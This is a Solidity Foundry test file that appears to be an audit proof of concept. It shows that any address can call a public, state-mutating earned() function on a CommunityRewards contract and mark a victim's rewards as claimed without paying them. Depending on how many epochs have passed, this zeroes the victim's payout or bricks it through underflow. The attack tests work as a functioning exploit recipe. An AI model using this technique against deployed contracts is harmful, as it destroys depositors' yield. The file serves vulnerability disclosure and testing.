// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.27;

import {Test, console2} from "forge-std/Test.sol";
import {CommunityRewards} from "../../src/CommunityRewards/CommunityRewards.sol";
import {ILoan} from "../../src/interfaces/ILoan.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract MockVE {
    function transferFrom(address, address, uint256) external {}
    function approve(address, uint256) external {}
    function ownerOf(uint256) external view returns (address) { return address(this); }
}

contract MockLoan {
    address public owner;
    constructor(address _owner) { owner = _owner; }
    // matches ILoan.requestLoan 7-arg signature used by CommunityRewards.initialize
    function requestLoan(uint256, uint256, ILoan.ZeroBalanceOption, uint256, address, bool, bool) external {}
    function setIncreasePercentage(uint256, uint256) external {}
}

contract MockRewardToken is ERC20 {
    constructor() ERC20("Reward", "RWD") {}
    function mint(address to, uint256 amt) external { _mint(to, amt); }
}

/// @notice PoC: CommunityRewards.earned() is a PUBLIC, state-mutating function (it writes
///         tokenClaimedPerEpoch += reward) while the actual payout + lastEarn cursor live only in
///         _getReward. So ANY address can call earned(token, victim) to mark a victim's rewards as
///         "claimed" WITHOUT paying them — permanently zeroing (single epoch) or BRICKING via underflow
///         (>=2 epochs) the victim's getReward(). Permissionless loss-of-yield for every depositor.
contract CommunityRewardsEarnedGrief is Test {
    uint256 constant WEEK = 7 days;
    uint256 constant MAIN_ID = 777;
    uint256 constant AMOUNT = 1000e18;   // victim's community-rewards balance
    uint256 constant REWARD = 100e18;    // reward funded for one epoch

    address protocolOwner = makeAddr("protocolOwner");
    address victim = makeAddr("victim");
    address attacker = makeAddr("attacker");

    MockVE ve;
    MockLoan loan;       // == `authorized`
    MockRewardToken rwd;
    CommunityRewards cr;

    uint256 START;

    function _deploy() internal returns (CommunityRewards) {
        ve = new MockVE();
        loan = new MockLoan(protocolOwner);
        rwd = new MockRewardToken();

        address[] memory rewardsList = new address[](1);
        rewardsList[0] = address(rwd);

        CommunityRewards impl = new CommunityRewards();
        ERC1967Proxy proxy = new ERC1967Proxy(address(impl), "");
        CommunityRewards c = CommunityRewards(address(proxy));
        c.initialize(address(loan), rewardsList, 0 /*threshold*/, MAIN_ID, address(ve));

        // fund the rewards contract so getReward can pay out
        rwd.mint(address(c), 1_000_000e18);
        return c;
    }

    /// Set up a victim with `AMOUNT` shares deposited at epoch E and `REWARD` notified for epoch E.
    /// `epochsForward` controls how many epochs elapse before claim (1 => single eligible epoch loop,
    /// 2 => two-epoch loop which is the underflow/brick case).
    function _setup(uint256 epochsForward) internal {
        cr = _deploy();
        START = 1000 * WEEK; // week-aligned
        vm.warp(START);

        // deposit (as authorized loan) -> mints shares + checkpoint for victim in epoch E
        vm.prank(address(loan));
        cr.deposit(MAIN_ID, AMOUNT, victim);

        // next epoch: notify reward -> credits epoch E (notify credits epochStart(now)-WEEK)
        vm.warp(START + WEEK + 1);
        vm.prank(address(loan));
        cr.notifyRewardAmount(address(rwd), REWARD);

        // advance to claim epoch
        vm.warp(START + epochsForward * WEEK + 1);
    }

    address[] tokensArr;

    function _tokens() internal returns (address[] memory) {
        delete tokensArr;
        tokensArr.push(address(rwd));
        return tokensArr;
    }

    /// CONTROL: with no interference, the victim claims their full reward R.
    function test_control_victimGetsReward() public {
        _setup(1);
        uint256 before = rwd.balanceOf(victim);
        vm.prank(victim);
        cr.getReward(_tokens());
        uint256 got = rwd.balanceOf(victim) - before;
        console2.log("control: victim received", got);
        assertEq(got, REWARD, "victim should receive full reward");
    }

    /// ATTACK (single epoch): attacker calls earned(token, victim) -> victim's getReward returns 0.
    function test_grief_singleEpoch_zeroesVictim() public {
        _setup(1);
        // L1: any EOA calls the public, state-mutating earned() on the victim
        vm.prank(attacker);
        cr.earned(address(rwd), victim); // no transfer happens, but tokenClaimedPerEpoch is now set

        uint256 before = rwd.balanceOf(victim);
        vm.prank(victim);
        cr.getReward(_tokens());
        uint256 got = rwd.balanceOf(victim) - before;
        console2.log("attack(1 epoch): victim received", got);
        assertEq(got, 0, "victim's reward was griefed to zero by a bare earned() call");
    }

    /// ATTACK (>=2 epochs): attacker's earned() call makes the victim's getReward UNDERFLOW-REVERT,
    /// permanently bricking their ability to claim.
    function test_grief_multiEpoch_bricksVictim() public {
        _setup(2);

        // sanity: control path (fresh victim2) would succeed over 2 epochs
        // here we grief the victim:
        vm.prank(attacker);
        cr.earned(address(rwd), victim);

        vm.prank(victim);
        vm.expectRevert(); // arithmetic underflow in the running-accumulator subtraction
        cr.getReward(_tokens());
        console2.log("attack(2 epochs): victim getReward reverted -> rewards permanently bricked");
    }
}
